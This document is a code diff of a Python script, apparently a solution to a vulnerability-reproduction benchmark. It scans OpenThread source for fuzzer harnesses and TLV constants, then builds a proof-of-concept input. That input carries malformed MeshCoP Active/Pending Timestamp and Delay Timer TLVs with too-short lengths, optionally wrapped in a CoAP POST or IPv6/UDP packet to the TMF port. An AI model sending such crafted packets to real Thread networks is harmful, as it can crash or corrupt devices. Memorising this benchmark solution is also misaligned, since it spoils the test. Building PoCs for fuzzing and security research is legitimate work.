@@ -1,190 +1,346 @@
 import os
 import re
 import tarfile
-from typing import Dict, Iterable, List, Optional, Tuple
+from typing import Dict, Iterable, Iterator, List, Optional, Tuple
+
+
+def _iter_source_texts_from_dir(root: str) -> Iterator[Tuple[str, str]]:
+    for base, _, files in os.walk(root):
+        for fn in files:
+            if not fn.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")):
+                continue
+            path = os.path.join(base, fn)
+            try:
+                st = os.stat(path)
+                if st.st_size > 2_000_000:
+                    continue
+                with open(path, "rb") as f:
+                    data = f.read()
+            except OSError:
+                continue
+            try:
+                text = data.decode("utf-8", "ignore")
+            except Exception:
+                continue
+            yield path, text
+
+
+def _iter_source_texts(src_path: str) -> Iterator[Tuple[str, str]]:
+    if os.path.isdir(src_path):
+        yield from _iter_source_texts_from_dir(src_path)
+        return
+    try:
+        with tarfile.open(src_path, "r:*") as tf:
+            for m in tf.getmembers():
+                if not m.isfile():
+                    continue
+                name = m.name
+                if not name.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")):
+                    continue
+                if m.size > 2_000_000:
+                    continue
+                try:
+                    f = tf.extractfile(m)
+                    if f is None:
+                        continue
+                    data = f.read()
+                except Exception:
+                    continue
+                try:
+                    text = data.decode("utf-8", "ignore")
+                except Exception:
+                    continue
+                yield name, text
+    except Exception:
+        return
+
+
+_INT_RE = re.compile(r"(?<![\w])(?:(0x[0-9a-fA-F]+)|([0-9]+))(?![\w])")
+_STR_RE = re.compile(r'"([^"\\]*(?:\\.[^"\\]*)*)"')
+
+
+def _parse_int_literal(token: str) -> Optional[int]:
+    token = token.strip()
+    m = _INT_RE.search(token)
+    if not m:
+        return None
+    if m.group(1):
+        try:
+            return int(m.group(1), 16)
+        except Exception:
+            return None
+    try:
+        return int(m.group(2), 10)
+    except Exception:
+        return None
+
+
+def _find_enum_value(text: str, name: str) -> Optional[int]:
+    # Common forms:
+    # kActiveTimestamp = 8,
+    # kDelayTimer = 10,
+    # kDelayTimer = 0x0a,
+    pat = re.compile(rf"(?<![\w]){re.escape(name)}(?![\w])\s*=\s*([^,}};\n]+)")
+    for m in pat.finditer(text):
+        val = _parse_int_literal(m.group(1))
+        if val is not None and 0 <= val <= 255:
+            return val
+    return None
+
+
+def _find_string_constant(text: str, name: str) -> Optional[str]:
+    # Common forms:
+    # const char kUriPendingSet[] = "a/sp";
+    # constexpr char kUri...[] = "a/sp";
+    pat = re.compile(rf"(?<![\w]){re.escape(name)}(?![\w]).*?=\s*({{0,1}})\s*\"")
+    m = pat.search(text)
+    if not m:
+        return None
+    start = m.end() - 1
+    m2 = _STR_RE.search(text, start)
+    if not m2:
+        return None
+    s = m2.group(1)
+    try:
+        s = bytes(s, "utf-8").decode("unicode_escape")
+    except Exception:
+        pass
+    s = s.strip()
+    if not s:
+        return None
+    return s
+
+
+def _encode_coap_option_header(delta: int, length: int) -> bytes:
+    def enc_nibble(x: int) -> Tuple[int, bytes]:
+        if x < 13:
+            return x, b""
+        if x < 269:
+            return 13, bytes([x - 13])
+        return 14, bytes([(x - 269) >> 8, (x - 269) & 0xFF])
+
+    dn, de = enc_nibble(delta)
+    ln, le = enc_nibble(length)
+    return bytes([(dn << 4) | ln]) + de + le
+
+
+def _build_coap_post(uri_path: str, payload: bytes) -> bytes:
+    uri_path = uri_path.strip()
+    if uri_path.startswith("/"):
+        uri_path = uri_path[1:]
+    if uri_path.endswith("/"):
+        uri_path = uri_path[:-1]
+    segments = [seg for seg in uri_path.split("/") if seg]
+
+    # CoAP: ver=1, type=CON(0), TKL=0 => 0x40
+    # Code=POST => 0x02
+    # Message ID = 0x0001
+    msg = bytearray(b"\x40\x02\x00\x01")
+
+    prev_opt = 0
+    for seg in segments:
+        opt_num = 11  # Uri-Path
+        delta = opt_num - prev_opt
+        seg_b = seg.encode("utf-8", "ignore")
+        msg += _encode_coap_option_header(delta, len(seg_b))
+        msg += seg_b
+        prev_opt = opt_num
+
+    msg += b"\xFF"
+    msg += payload
+    return bytes(msg)
+
+
+def _checksum16_ones_complement(data: bytes) -> int:
+    if len(data) & 1:
+        data += b"\x00"
+    s = 0
+    for i in range(0, len(data), 2):
+        s += (data[i] << 8) | data[i + 1]
+        s = (s & 0xFFFF) + (s >> 16)
+    while s >> 16:
+        s = (s & 0xFFFF) + (s >> 16)
+    return (~s) & 0xFFFF
+
+
+def _build_ipv6_udp_packet(udp_payload: bytes, src_ip: bytes, dst_ip: bytes, src_port: int, dst_port: int) -> bytes:
+    udp_len = 8 + len(udp_payload)
+    udp = bytearray()
+    udp += bytes([(src_port >> 8) & 0xFF, src_port & 0xFF, (dst_port >> 8) & 0xFF, dst_port & 0xFF])
+    udp += bytes([(udp_len >> 8) & 0xFF, udp_len & 0xFF])
+    udp += b"\x00\x00"  # checksum placeholder
+    udp += udp_payload
+
+    pseudo = bytearray()
+    pseudo += src_ip
+    pseudo += dst_ip
+    pseudo += bytes([(udp_len >> 24) & 0xFF, (udp_len >> 16) & 0xFF, (udp_len >> 8) & 0xFF, udp_len & 0xFF])
+    pseudo += b"\x00\x00\x00" + b"\x11"  # next header = UDP(17)
+    csum = _checksum16_ones_complement(bytes(pseudo) + bytes(udp))
+    if csum == 0:
+        csum = 0xFFFF
+    udp[6] = (csum >> 8) & 0xFF
+    udp[7] = csum & 0xFF
+
+    ipv6 = bytearray()
+    ipv6 += b"\x60\x00\x00\x00"  # Version 6
+    ipv6 += bytes([(udp_len >> 8) & 0xFF, udp_len & 0xFF])  # payload length
+    ipv6 += b"\x11"  # next header UDP
+    ipv6 += b"\x40"  # hop limit
+    ipv6 += src_ip
+    ipv6 += dst_ip
+    ipv6 += udp
+    return bytes(ipv6)
+
+
+def _detect_fuzzer_mode(files: List[Tuple[str, str]]) -> Tuple[str, Optional[str]]:
+    fuzzers: List[Tuple[str, str]] = []
+    for path, text in files:
+        if "LLVMFuzzerTestOneInput" in text:
+            fuzzers.append((path, text))
+
+    if not fuzzers:
+        return "tlvs", None
+
+    def score_fuzzer(t: str) -> int:
+        kws = [
+            "Dataset",
+            "otDataset",
+            "MeshCoP",
+            "ActiveTimestamp",
+            "PendingTimestamp",
+            "DelayTimer",
+            "MGMT",
+            "Mgmt",
+            "Coap",
+            "Tmf",
+        ]
+        sc = 0
+        for kw in kws:
+            sc += 5 * t.count(kw)
+        return sc
+
+    fuzzers.sort(key=lambda x: (score_fuzzer(x[1]), ("dataset" in x[0].lower()), -len(x[1])), reverse=True)
+    fpath, ftext = fuzzers[0]
+
+    lower = ftext.lower()
+    mode = "tlvs"
+    if "otip6receive" in lower or "ip6::" in ftext or "udp::" in ftext:
+        mode = "ipv6"
+    elif "coap" in lower:
+        mode = "coap"
+
+    # Try to discover which URI is used
+    uri_hint = None
+    for s in ("kUriPendingSet", "kUriActiveSet", "OPENTHREAD_URI_PENDING_SET", "OPENTHREAD_URI_ACTIVE_SET"):
+        if s in ftext:
+            uri_hint = s
+            break
+    if uri_hint is None:
+        # Look for literal segments used in Uri-Path options
+        # Very heuristic: if "a/sp" or "a/sa" appears, use it
+        if "a/sp" in ftext:
+            uri_hint = "a/sp"
+        elif "a/sa" in ftext:
+            uri_hint = "a/sa"
+        elif "/sp" in ftext:
+            uri_hint = "a/sp"
+        elif "/sa" in ftext:
+            uri_hint = "a/sa"
+
+    return mode, uri_hint
+
+
+def _extract_constants(files: List[Tuple[str, str]]) -> Dict[str, int]:
+    want = ["kActiveTimestamp", "kPendingTimestamp", "kDelayTimer"]
+    found: Dict[str, int] = {}
+    for name in want:
+        for _, text in files:
+            v = _find_enum_value(text, name)
+            if v is not None:
+                found[name] = v
+                break
+
+    # Reasonable fallbacks for Thread MeshCoP Dataset TLVs
+    found.setdefault("kActiveTimestamp", 8)
+    found.setdefault("kPendingTimestamp", 9)
+    found.setdefault("kDelayTimer", 10)
+    return found
+
+
+def _extract_uri(files: List[Tuple[str, str]], prefer_pending: bool, uri_hint: Optional[str]) -> str:
+    if uri_hint and "/" in uri_hint and uri_hint[0].isalnum():
+        return uri_hint
+
+    pending_names = ["kUriPendingSet", "OPENTHREAD_URI_PENDING_SET"]
+    active_names = ["kUriActiveSet", "OPENTHREAD_URI_ACTIVE_SET"]
+
+    def find_any(names: List[str]) -> Optional[str]:
+        for nm in names:
+            for _, text in files:
+                s = _find_string_constant(text, nm)
+                if s and "/" in s and len(s) <= 32:
+                    return s
+        return None
+
+    pending = find_any(pending_names)
+    active = find_any(active_names)
+
+    if prefer_pending:
+        if pending:
+            return pending
+        if active:
+            return active
+    else:
+        if active:
+            return active
+        if pending:
+            return pending
+
+    return "a/sp" if prefer_pending else "a/sa"
 
 
 class Solution:
-    def _iter_text_files(self, src_path: str) -> Iterable[Tuple[str, str]]:
-        exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")
-        name_keywords = ("dataset", "meshcop", "tlv", "fuzz", "fuzzer", "openthread", "thread", "coap", "mgmt")
-        max_bytes = 512 * 1024
-
-        def should_consider(name: str) -> bool:
-            nl = name.lower()
-            if not nl.endswith(exts):
-                return False
-            return any(k in nl for k in name_keywords)
-
-        if os.path.isdir(src_path):
-            for root, _, files in os.walk(src_path):
-                for fn in files:
-                    if not fn.lower().endswith(exts):
-                        continue
-                    full = os.path.join(root, fn)
-                    if not should_consider(full):
-                        continue
-                    try:
-                        st = os.stat(full)
-                        if st.st_size <= 0:
-                            continue
-                        with open(full, "rb") as f:
-                            data = f.read(min(st.st_size, max_bytes))
-                        yield full, data.decode("utf-8", errors="ignore")
-                    except Exception:
-                        continue
-        else:
-            try:
-                with tarfile.open(src_path, "r:*") as tf:
-                    for m in tf.getmembers():
-                        if not m.isfile():
-                            continue
-                        name = m.name
-                        if not should_consider(name):
-                            continue
-                        try:
-                            f = tf.extractfile(m)
-                            if f is None:
-                                continue
-                            data = f.read(min(m.size, max_bytes))
-                            yield name, data.decode("utf-8", errors="ignore")
-                        except Exception:
-                            continue
-            except Exception:
-                return
-
-    def _parse_int(self, s: str) -> Optional[int]:
-        s = s.strip()
-        try:
-            if s.lower().startswith("0x"):
-                return int(s, 16)
-            return int(s, 10)
-        except Exception:
-            return None
-
-    def _extract_tlv_types(self, src_path: str) -> Dict[str, int]:
-        wanted = {
-            "kChannel": None,
-            "kPanId": None,
-            "kExtendedPanId": None,
-            "kNetworkName": None,
-            "kPskc": None,
-            "kNetworkKey": None,
-            "kMeshLocalPrefix": None,
-            "kSecurityPolicy": None,
-            "kActiveTimestamp": None,
-            "kPendingTimestamp": None,
-            "kDelayTimer": None,
-        }
-
-        patterns = [
-            re.compile(r"\b(kChannel|kPanId|kExtendedPanId|kNetworkName|kPskc|kNetworkKey|kMeshLocalPrefix|kSecurityPolicy|kActiveTimestamp|kPendingTimestamp|kDelayTimer)\b\s*=\s*(0x[0-9a-fA-F]+|\d+)")
-        ]
-
-        for _, txt in self._iter_text_files(src_path):
-            if "kActiveTimestamp" not in txt and "ActiveTimestamp" not in txt and "kPendingTimestamp" not in txt and "DelayTimer" not in txt and "kNetworkKey" not in txt:
-                continue
-            for pat in patterns:
-                for m in pat.finditer(txt):
-                    key = m.group(1)
-                    val = self._parse_int(m.group(2))
-                    if val is None:
-                        continue
-                    if 0 <= val <= 255 and key in wanted and wanted[key] is None:
-                        wanted[key] = val
-            if all(v is not None for v in wanted.values()):
-                break
-
-        res: Dict[str, int] = {}
-        for k, v in wanted.items():
-            if v is not None:
-                res[k] = v
-        return res
-
-    def _detect_fuzzer_usage(self, src_path: str) -> Tuple[bool, bool]:
-        uses_active = False
-        uses_pending = False
-
-        for _, txt in self._iter_text_files(src_path):
-            if "LLVMFuzzerTestOneInput" not in txt:
-                continue
-            if ("otDatasetSetActiveTlvs" in txt) or ("SendMgmtActiveSet" in txt) or ("MgmtActiveSet" in txt) or ("SetActiveTlvs" in txt):
-                uses_active = True
-            if ("otDatasetSetPendingTlvs" in txt) or ("SendMgmtPendingSet" in txt) or ("MgmtPendingSet" in txt) or ("SetPendingTlvs" in txt):
-                uses_pending = True
-            if uses_active and uses_pending:
-                break
-
-        if not uses_active and not uses_pending:
-            for _, txt in self._iter_text_files(src_path):
-                if "Dataset" not in txt and "dataset" not in txt:
-                    continue
-                if ("SetActive" in txt) or ("ActiveDataset" in txt) or ("ActiveTlvs" in txt):
-                    uses_active = True
-                if ("SetPending" in txt) or ("PendingDataset" in txt) or ("PendingTlvs" in txt) or ("DelayTimer" in txt):
-                    uses_pending = True
-                if uses_active and uses_pending:
-                    break
-
-        if not uses_active and not uses_pending:
-            uses_active = True
-            uses_pending = True
-
-        return uses_active, uses_pending
-
-    def _tlv(self, t: int, value: bytes) -> bytes:
-        t &= 0xFF
-        ln = len(value) & 0xFF
-        return bytes((t, ln)) + value
-
     def solve(self, src_path: str) -> bytes:
-        types = self._extract_tlv_types(src_path)
-        uses_active, uses_pending = self._detect_fuzzer_usage(src_path)
+        files = list(_iter_source_texts(src_path))
+        consts = _extract_constants(files)
+        mode, uri_hint = _detect_fuzzer_mode(files)
 
-        # Thread MeshCoP TLV type fallbacks (common OpenThread values)
-        kChannel = types.get("kChannel", 0)
-        kPanId = types.get("kPanId", 1)
-        kExtendedPanId = types.get("kExtendedPanId", 2)
-        kNetworkName = types.get("kNetworkName", 3)
-        kPskc = types.get("kPskc", 4)
-        kNetworkKey = types.get("kNetworkKey", 5)
-        kMeshLocalPrefix = types.get("kMeshLocalPrefix", 7)
-        kSecurityPolicy = types.get("kSecurityPolicy", 12)
-        kActiveTimestamp = types.get("kActiveTimestamp", 14)
-        kPendingTimestamp = types.get("kPendingTimestamp", 51)
-        kDelayTimer = types.get("kDelayTimer", 52)
+        # Malformed TLVs: too-short length (1) for required sizes (8/8/4)
+        payload = bytes(
+            [
+                consts["kActiveTimestamp"],
+                1,
+                0,
+                consts["kPendingTimestamp"],
+                1,
+                0,
+                consts["kDelayTimer"],
+                1,
+                0,
+            ]
+        )
 
-        # Build a plausible operational dataset TLV set and include invalid TLVs
-        # for the vulnerable minimum-length checks (length < required).
-        out = bytearray()
+        prefer_pending = True
+        if uri_hint:
+            lh = uri_hint.lower()
+            if "active" in lh or lh.endswith("a/sa") or lh.endswith("/sa"):
+                prefer_pending = False
+            elif "pending" in lh or lh.endswith("a/sp") or lh.endswith("/sp"):
+                prefer_pending = True
 
-        # Channel TLV: [page=0][channel=11]
-        out += self._tlv(kChannel, bytes((0x00, 0x00, 0x0B)))
-        # PAN ID TLV: 0x1234
-        out += self._tlv(kPanId, bytes((0x12, 0x34)))
-        # Extended PAN ID TLV: 8 bytes
-        out += self._tlv(kExtendedPanId, bytes((1, 2, 3, 4, 5, 6, 7, 8)))
-        # Network Name TLV: "a"
-        out += self._tlv(kNetworkName, b"a")
-        # PSKc TLV: 16 bytes
-        out += self._tlv(kPskc, b"B" * 16)
-        # Network Key TLV: 16 bytes
-        out += self._tlv(kNetworkKey, b"C" * 16)
-        # Mesh Local Prefix TLV: 8 bytes (/64)
-        out += self._tlv(kMeshLocalPrefix, bytes((0xFD, 0x00, 0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00)))
-        # Security Policy TLV: 3 bytes (rotation time + flags) (values arbitrary but sized correctly)
-        out += self._tlv(kSecurityPolicy, bytes((0x00, 0x10, 0x01)))
+        if mode == "coap":
+            uri = _extract_uri(files, prefer_pending=prefer_pending, uri_hint=uri_hint)
+            return _build_coap_post(uri, payload)
 
-        # Invalid minimum lengths:
-        # Active Timestamp should be 8 bytes; use 1.
-        if uses_active or uses_pending:
-            out += bytes((kActiveTimestamp & 0xFF, 0x01, 0x00))
+        if mode == "ipv6":
+            uri = _extract_uri(files, prefer_pending=prefer_pending, uri_hint=uri_hint)
+            coap = _build_coap_post(uri, payload)
 
-        # Pending dataset fields
-        if uses_pending:
-            # Pending Timestamp should be 8 bytes; use 1.
-            out += bytes((kPendingTimestamp & 0xFF, 0x01, 0x00))
-            # Delay Timer should be 4 bytes; use 1.
-            out += bytes((kDelayTimer & 0xFF, 0x01, 0x00))
+            # Use multicast destination likely accepted by Thread stack; ports: TMF 61631 (0xF0BF)
+            src_ip = bytes.fromhex("fe800000000000000000000000000001")
+            dst_ip = bytes.fromhex("ff030000000000000000000000000001")
+            port = 61631
+            return _build_ipv6_udp_packet(coap, src_ip, dst_ip, port, port)
 
-        return bytes(out)
+        return payload
